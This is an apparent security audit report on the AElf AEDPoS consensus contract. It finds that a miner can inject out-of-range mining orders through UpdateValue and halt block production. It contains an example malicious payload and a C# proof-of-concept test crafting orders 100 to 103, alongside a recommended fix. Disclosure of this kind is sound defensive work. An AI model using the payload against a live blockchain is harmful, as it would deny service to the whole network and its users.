# Audit Report

## Title
Missing Range Validation on Mining Orders Allows Consensus DoS via Invalid Order Assignment

## Summary
The AEDPoS consensus contract lacks range validation for `FinalOrderOfNextRound` values when miners submit `UpdateValue` transactions. A malicious miner can inject out-of-range order values (e.g., 100, 101) that bypass validation, corrupt the consensus state, and cause complete blockchain halt when the next round attempts to generate.

## Finding Description

The vulnerability exists across multiple validation layers that each fail to prevent out-of-range mining order assignments:

**Root Cause - Insufficient Validation Logic:**

The `NextRoundMiningOrderValidationProvider` only performs a count-based check without validating actual order values or ranges: [1](#0-0) 

This validation confirms the count of distinct orders matches miners who produced blocks, but critically fails to verify orders are within [1, minersCount] or sequential without gaps.

**Attack Vector - Unvalidated Order Injection:**

Miners can inject arbitrary orders through `UpdateValue`, which is a public RPC method: [5](#0-4) 

The `UpdateValueInput` accepts a `tune_order_information` map allowing arbitrary miner-to-order assignments: [6](#0-5) 

When `ProcessUpdateValue` executes, it blindly applies these values to state without any validation: [3](#0-2) 

**Why Existing Protections Fail:**

1. The validation service only uses `UpdateValueValidationProvider` for `UpdateValue` behavior, which does NOT validate `tune_order_information` ranges: [2](#0-1) 

2. `NextRoundMiningOrderValidationProvider` is ONLY invoked for `NextRound` behavior, NOT for `UpdateValue`: [4](#0-3) 

3. Post-execution validation cannot prevent the attack because both header and state contain the same corrupted values: [7](#0-6) 

**Exploitation Path - Consensus Failure:**

When `GenerateNextRoundInformation` uses corrupted `FinalOrderOfNextRound` values, it directly assigns them as `Order` in the next round: [8](#0-7) 

This causes immediate failures in critical consensus operations:

- `BreakContinuousMining` assumes Order 1 exists and throws `InvalidOperationException` when calling `First(i => i.Order == 1)`: [9](#0-8) 

- Similarly fails for Order 2: [10](#0-9) 

- `GetMiningInterval` fails when no miners have Order 1 or 2, throwing `ArgumentOutOfRangeException`: [11](#0-10) 

- `FirstMiner()` returns null when Order 1 doesn't exist, breaking time calculations: [12](#0-11) 

## Impact Explanation

**Severity: HIGH - Complete Consensus System Failure**

This vulnerability causes catastrophic blockchain failure:

1. **Network-Wide Halt**: Once corrupted orders are applied, ALL miners attempting to produce the next round will encounter exceptions in `GenerateNextRoundInformation`, `BreakContinuousMining`, or `GetMiningInterval`, preventing any new blocks from being produced.

2. **Irrecoverable State**: The consensus state is persisted with invalid orders. The blockchain cannot self-heal - it requires hard fork or manual state intervention to recover.

3. **Complete DoS**: While no funds are stolen, the entire blockchain becomes non-operational, halting all transactions, smart contract executions, and token transfers.

4. **Production Impact**: This affects mainnet operations where consensus integrity is critical for business continuity.

The impact qualifies as HIGH severity because it breaks a fundamental protocol invariant (consensus availability) affecting the entire network's ability to produce blocks.

## Likelihood Explanation

**Probability: HIGH - Low Barrier to Execution**

The attack has minimal prerequisites and high feasibility:

**Attacker Capabilities:**
- Any miner in the current mining schedule can execute this attack
- No special permissions required beyond being an active validator
- Single malicious block with crafted consensus data is sufficient

**Attack Complexity:**
- LOW: Miner produces block with modified `FinalOrderOfNextRound` values in header
- Includes matching `UpdateValue` transaction with out-of-range `tune_order_information`
- Example payload: `{"miner1": 100, "miner2": 101, "miner3": 1, "miner4": 2}`
- No cryptographic breaks or complex exploitation required

**Feasibility:**
- Miners control the blocks they produce and consensus data included
- No economic cost beyond standard transaction fees
- Validation gaps ensure the malicious transaction passes all checks
- Immediate effect once block is accepted

**Detection Constraints:**
- Attack appears as normal `UpdateValue` until next round generation
- By the time failure is detected, state corruption is already persisted
- No monitoring can prevent execution since validation allows it

The combination of low complexity, minimal prerequisites, and guaranteed success makes this HIGH likelihood.

## Recommendation

Implement comprehensive range validation for mining orders at multiple checkpoints:

**1. Add Range Validation to UpdateValueValidationProvider:**

Validate `tune_order_information` values during `UpdateValue` validation:

```csharp
// In UpdateValueValidationProvider.ValidateHeaderInformation
var minersCount = validationContext.BaseRound.RealTimeMinersInformation.Count;
foreach (var tuneOrder in validationContext.ProvidedRound.RealTimeMinersInformation)
{
    if (tuneOrder.Value.FinalOrderOfNextRound < 1 || 
        tuneOrder.Value.FinalOrderOfNextRound > minersCount)
        return new ValidationResult { Message = "Invalid FinalOrderOfNextRound range." };
}

// Check for duplicates and gaps
var orders = validationContext.ProvidedRound.RealTimeMinersInformation.Values
    .Select(m => m.FinalOrderOfNextRound).Where(o => o > 0).ToList();
var expectedOrders = Enumerable.Range(1, orders.Count).ToHashSet();
if (!orders.ToHashSet().SetEquals(expectedOrders))
    return new ValidationResult { Message = "Mining orders must be sequential from 1." };
```

**2. Enhance NextRoundMiningOrderValidationProvider:**

Add explicit range and sequentiality checks: [13](#0-12) 

**3. Add Defensive Checks in ProcessUpdateValue:**

Validate `TuneOrderInformation` before applying to state: [14](#0-13) 

## Proof of Concept

```csharp
[Fact]
public async Task MaliciousUpdateValue_WithInvalidOrders_CausesConsensusHalt()
{
    // Initialize consensus with 4 miners
    await InitializeConsensusWithMiners(4);
    
    var firstRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var maliciousMiner = InitialCoreDataCenterKeyPairs[0];
    
    // Produce blocks normally for first round
    foreach (var minerInRound in firstRound.RealTimeMinersInformation.Values.OrderBy(m => m.Order))
    {
        var keyPair = InitialCoreDataCenterKeyPairs.First(p => p.PublicKey.ToHex() == minerInRound.Pubkey);
        await ProduceNormalBlock(keyPair, minerInRound);
    }
    
    // Malicious miner crafts UpdateValue with out-of-range orders
    var maliciousInput = new UpdateValueInput
    {
        // Valid OutValue and Signature from legitimate consensus data
        OutValue = Hash.FromString("valid_out_value"),
        Signature = Hash.FromString("valid_signature"),
        RoundId = firstRound.RoundId,
        ActualMiningTime = Context.CurrentBlockTime,
        SupposedOrderOfNextRound = 1,
        
        // MALICIOUS: Set orders to 100, 101, 102, 103 instead of 1, 2, 3, 4
        TuneOrderInformation =
        {
            { InitialCoreDataCenterKeyPairs[0].PublicKey.ToHex(), 100 },
            { InitialCoreDataCenterKeyPairs[1].PublicKey.ToHex(), 101 },
            { InitialCoreDataCenterKeyPairs[2].PublicKey.ToHex(), 102 },
            { InitialCoreDataCenterKeyPairs[3].PublicKey.ToHex(), 103 }
        }
    };
    
    // Transaction passes validation and corrupts state
    var result = await GetAEDPoSContractStub(maliciousMiner).UpdateValue.SendAsync(maliciousInput);
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify state is corrupted with invalid orders
    var corruptedRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    corruptedRound.RealTimeMinersInformation.Values
        .Any(m => m.FinalOrderOfNextRound == 100).ShouldBeTrue();
    
    // Attempt to generate next round - SHOULD THROW EXCEPTION
    await Should.ThrowAsync<InvalidOperationException>(async () =>
    {
        var nextRoundData = await AEDPoSContractStub.GetConsensusExtraData.CallAsync(
            new AElfConsensusTriggerInformation
            {
                Behaviour = AElfConsensusBehaviour.NextRound,
                Pubkey = ByteString.CopyFrom(maliciousMiner.PublicKey)
            }.ToBytesValue());
        
        // GenerateNextRoundInformation will fail in BreakContinuousMining
        // when trying to find Order == 1 with First() - no such miner exists
    });
    
    // CONSENSUS HALTED - No new blocks can be produced
}
```

**Notes:**
- The test demonstrates that malicious `tune_order_information` values bypass all validation layers
- Once applied, the consensus state corruption prevents any miner from producing the next round
- The blockchain is effectively halted until manual intervention
- This is a critical consensus availability vulnerability requiring immediate patching

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/NextRoundMiningOrderValidationProvider.cs (L9-25)
```csharp
    public ValidationResult ValidateHeaderInformation(ConsensusValidationContext validationContext)
    {
        // Miners that have determined the order of the next round should be equal to
        // miners that mined blocks during current round.
        var validationResult = new ValidationResult();
        var providedRound = validationContext.ProvidedRound;
        var distinctCount = providedRound.RealTimeMinersInformation.Values.Where(m => m.FinalOrderOfNextRound > 0)
            .Distinct().Count();
        if (distinctCount != providedRound.RealTimeMinersInformation.Values.Count(m => m.OutValue != null))
        {
            validationResult.Message = "Invalid FinalOrderOfNextRound.";
            return validationResult;
        }

        validationResult.Success = true;
        return validationResult;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/UpdateValueValidationProvider.cs (L10-19)
```csharp
    public ValidationResult ValidateHeaderInformation(ConsensusValidationContext validationContext)
    {
        // Only one Out Value should be filled.
        if (!NewConsensusInformationFilled(validationContext))
            return new ValidationResult { Message = "Incorrect new Out Value." };

        if (!ValidatePreviousInValue(validationContext))
            return new ValidationResult { Message = "Incorrect previous in value." };

        return new ValidationResult { Success = true };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L238-285)
```csharp
    private void ProcessUpdateValue(UpdateValueInput updateValueInput)
    {
        TryToGetCurrentRoundInformation(out var currentRound);

        var minerInRound = currentRound.RealTimeMinersInformation[_processingBlockMinerPubkey];
        minerInRound.ActualMiningTimes.Add(updateValueInput.ActualMiningTime);
        minerInRound.Signature = updateValueInput.Signature;
        minerInRound.OutValue = updateValueInput.OutValue;
        minerInRound.SupposedOrderOfNextRound = updateValueInput.SupposedOrderOfNextRound;
        minerInRound.FinalOrderOfNextRound = updateValueInput.SupposedOrderOfNextRound;
        minerInRound.ImpliedIrreversibleBlockHeight = updateValueInput.ImpliedIrreversibleBlockHeight;

        // Just add 1 based on previous data, do not use provided values.
        minerInRound.ProducedBlocks = minerInRound.ProducedBlocks.Add(1);
        minerInRound.ProducedTinyBlocks = minerInRound.ProducedTinyBlocks.Add(1);

        if (IsSecretSharingEnabled())
        {
            PerformSecretSharing(updateValueInput, minerInRound, currentRound, _processingBlockMinerPubkey);
        }

        foreach (var tuneOrder in updateValueInput.TuneOrderInformation)
            currentRound.RealTimeMinersInformation[tuneOrder.Key].FinalOrderOfNextRound = tuneOrder.Value;

        // It is permissible for miners not publish their in values.
        if (updateValueInput.PreviousInValue != Hash.Empty)
            minerInRound.PreviousInValue = updateValueInput.PreviousInValue;

        if (TryToGetPreviousRoundInformation(out var previousRound))
        {
            new LastIrreversibleBlockHeightCalculator(currentRound, previousRound).Deconstruct(
                out var libHeight);
            Context.LogDebug(() => $"Finished calculation of lib height: {libHeight}");
            // LIB height can't be available if it is lower than last time.
            if (currentRound.ConfirmedIrreversibleBlockHeight < libHeight)
            {
                Context.LogDebug(() => $"New lib height: {libHeight}");
                Context.Fire(new IrreversibleBlockFound
                {
                    IrreversibleBlockHeight = libHeight
                });
                currentRound.ConfirmedIrreversibleBlockHeight = libHeight;
                currentRound.ConfirmedIrreversibleBlockRoundNumber = currentRound.RoundNumber.Sub(1);
            }
        }

        if (!TryToUpdateRoundInformation(currentRound)) Assert(false, "Failed to update round information.");
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L79-88)
```csharp
            case AElfConsensusBehaviour.UpdateValue:
                validationProviders.Add(new UpdateValueValidationProvider());
                // Is confirmed lib height and lib round number went down? (Which should not happens.)
                validationProviders.Add(new LibInformationValidationProvider());
                break;
            case AElfConsensusBehaviour.NextRound:
                // Is sender's order of next round correct?
                validationProviders.Add(new NextRoundMiningOrderValidationProvider());
                validationProviders.Add(new RoundTerminateValidationProvider());
                break;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract.cs (L98-101)
```csharp
    public override Empty UpdateValue(UpdateValueInput input)
    {
        ProcessConsensusInformation(input);
        return new Empty();
```

**File:** protobuf/aedpos_contract.proto (L207-208)
```text
    // The tuning order of mining for the next round, miner public key -> order.
    map<string, int32> tune_order_information = 7;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Recover.cs (L22-30)
```csharp
        foreach (var information in providedRound.RealTimeMinersInformation)
        {
            RealTimeMinersInformation[information.Key].SupposedOrderOfNextRound =
                information.Value.SupposedOrderOfNextRound;
            RealTimeMinersInformation[information.Key].FinalOrderOfNextRound =
                information.Value.FinalOrderOfNextRound;
            RealTimeMinersInformation[information.Key].PreviousInValue =
                information.Value.PreviousInValue;
        }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L26-32)
```csharp
        foreach (var minerInRound in minersMinedCurrentRound.OrderBy(m => m.FinalOrderOfNextRound))
        {
            var order = minerInRound.FinalOrderOfNextRound;
            nextRound.RealTimeMinersInformation[minerInRound.Pubkey] = new MinerInRound
            {
                Pubkey = minerInRound.Pubkey,
                Order = order,
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L79-79)
```csharp
        var firstMinerOfNextRound = nextRound.RealTimeMinersInformation.Values.First(i => i.Order == 1);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L83-84)
```csharp
            var secondMinerOfNextRound =
                nextRound.RealTimeMinersInformation.Values.First(i => i.Order == 2);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L76-80)
```csharp
        var firstTwoMiners = RealTimeMinersInformation.Values.Where(m => m.Order == 1 || m.Order == 2)
            .ToList();

        return Math.Abs((int)(firstTwoMiners[1].ExpectedMiningTime - firstTwoMiners[0].ExpectedMiningTime)
            .Milliseconds());
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L144-145)
```csharp
        return RealTimeMinersInformation.Count > 0
            ? RealTimeMinersInformation.Values.FirstOrDefault(m => m.Order == 1)
```
